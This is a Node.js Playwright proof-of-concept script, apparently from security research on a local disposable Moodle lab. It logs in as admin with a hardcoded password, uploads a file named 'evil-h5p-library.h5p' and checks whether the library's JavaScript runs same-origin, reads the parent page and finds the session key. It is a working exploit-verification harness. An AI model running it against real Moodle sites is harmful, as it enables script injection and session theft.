/*
 * h5p-library-test.cjs — LIVE proof that an uploaded H5P *library*'s preloadedJs
 * executes in Moodle, same-origin. LOCAL disposable lab only.
 *
 * As admin (who holds moodle/h5p:updatelibraries) we upload evil-h5p-library.h5p to the
 * Content Bank; Moodle installs the custom library H5P.ExePocAlert and deploys the
 * content. On view, the library's run.js sets window.__EXE_POC_H5P_LIB and renders a
 * notice — demonstrating that library JS is trusted code that runs same-origin.
 *
 * Run: NODE_PATH=<wp-exelearning>/node_modules node h5p-library-test.cjs
 */
const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');

const BASE = 'http://localhost';
const USER = 'user';
const PASS = '1234';                 // local disposable admin credential (env owner authorised)
const PKG = path.join(__dirname, '..', 'poc', 'evil-h5p-library.h5p');
const CTXID = 1;                     // system context content bank

const out = { browser: 'chromium', target: 'Moodle Content Bank — H5P library preloadedJs', date: '2026-06-14', steps: {} };
const consoleHits = [];

(async () => {
  const browser = await chromium.launch();
  const ctx = await browser.newContext({ acceptDownloads: false });
  const page = await ctx.newPage();
  page.on('console', m => { const t = m.text(); if (/EXE-POC/.test(t)) consoleHits.push(t.slice(0, 200)); });

  // --- login (e2e-style, local lab) ---
  await page.goto(`${BASE}/login/index.php`, { waitUntil: 'domcontentloaded' });
  await page.fill('#username', USER);
  await page.fill('#password', PASS);
  await Promise.all([page.waitForLoadState('networkidle').catch(() => {}), page.click('#loginbtn')]);
  out.steps.loggedIn = await page.evaluate(() => !!(window.M && window.M.cfg && window.M.cfg.userId)).catch(() => false);

  // --- content bank index (Spanish UI: "Subir" opens the Moodle file picker) ---
  await page.goto(`${BASE}/contentbank/index.php?contextid=${CTXID}`, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1500);
  out.steps.onIndexPage = /contentbank\/index/.test(page.url());

  // open the file picker via the "Subir" toolbar button
  try {
    const subir = page.locator('button:has-text("Subir"), a:has-text("Subir"), [data-action*="upload"]').first();
    await subir.click({ timeout: 8000 });
    // wait for the Moodle file picker modal
    await page.waitForSelector('.file-picker, input[type="file"]', { timeout: 10000 });
    await page.waitForTimeout(1000);
    // ensure the "Subir un archivo" repository pane is active, if a repo list shows
    const repo = page.locator('.fp-repo:has-text("Subir"), span:has-text("Subir un archivo")').first();
    if (await repo.count()) { await repo.click().catch(() => {}); await page.waitForTimeout(600); }
    // set the file on the repository upload input
    const fileInput = page.locator('input[type="file"]').first();
    await fileInput.setInputFiles(PKG, { timeout: 8000 });
    out.steps.fileSet = true;
    // confirm upload ("Subir este archivo")
    const upBtn = page.locator('.fp-upload-btn button, button:has-text("Subir este archivo"), button:has-text("Upload this file")').first();
    await Promise.all([page.waitForLoadState('networkidle').catch(() => {}), upBtn.click({ timeout: 8000 })]);
    out.steps.uploadClicked = true;
    await page.waitForTimeout(3000);
  } catch (e) { out.steps.pickerError = String(e).slice(0, 220); }

  out.steps.afterSaveUrl = page.url();
  // capture any Moodle validation/error notice
  out.steps.pageNotice = await page.evaluate(() => {
    const n = document.querySelector('.alert-danger, .errormessage, #notice, .box.errorbox');
    return n ? n.textContent.trim().slice(0, 300) : null;
  }).catch(() => null);

  // --- if we landed on a content view, read the PoC signal (top + every frame) ---
  async function readSignal() {
    const frames = page.frames();
    for (const f of frames) {
      const r = await f.evaluate(() => {
        const sig = window.__EXE_POC_H5P_LIB || null;
        const banner = !!document.querySelector('[data-exe-poc]');
        const bannerText = (document.querySelector('[data-exe-poc]') || {}).textContent || null;
        const origin = window.origin;
        return { sig, banner, bannerText: bannerText ? bannerText.slice(0, 160) : null, origin, url: location.href.slice(0, 120) };
      }).catch(() => null);
      if (r && (r.sig || r.banner)) return r;
    }
    return null;
  }
  await page.waitForTimeout(1500);
  out.steps.signal = await readSignal();
  out.steps.consoleHits = consoleHits;

  // verdict
  const s = out.steps.signal;
  out.verdict = {
    library_js_executed: !!(s && (s.banner || (s.sig && s.sig.libraryJsRan))),
    same_origin: !!(s && s.sig && s.sig.sameOrigin),
    can_read_parent_dom: !!(s && s.sig && s.sig.canReadParentDom),
    can_find_sesskey_boolean: !!(s && s.sig && s.sig.canFindSesskey),
  };

  await browser.close();
  fs.writeFileSync(path.join(__dirname, 'resultados-h5p-library.json'), JSON.stringify(out, null, 2));
  console.log(JSON.stringify(out, null, 2));
})().catch(e => { console.error('FATAL', e); try { fs.writeFileSync(path.join(__dirname, 'resultados-h5p-library.json'), JSON.stringify({ ...out, fatal: String(e).slice(0, 300), consoleHits }, null, 2)); } catch (_) {} process.exit(1); });
